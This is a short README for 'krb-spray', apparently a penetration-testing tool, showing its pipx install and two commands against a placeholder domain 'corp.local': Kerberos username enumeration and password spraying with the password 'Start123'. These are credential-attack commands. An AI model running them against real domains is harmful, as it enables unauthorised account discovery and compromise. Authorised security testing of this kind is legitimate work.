# krb-spray

## Setup

Install with [pipx](https://github.com/pypa/pipx/).

~~~ bash
pipx install git+https://github.com/dadevel/krb-spray.git
~~~

## Usage

User enumeration.

~~~ bash
krb-spray -d corp.local -U ./users.txt -p '' | jq -c 'select(.error != "KDC_ERR_C_PRINCIPAL_UNKNOWN")'
~~~

Password spraying.

~~~ bash
krb-spray -d corp.local -U ./users.txt -p Start123 | jq -c 'select(.error == "KDC_ERR_NONE")'
~~~
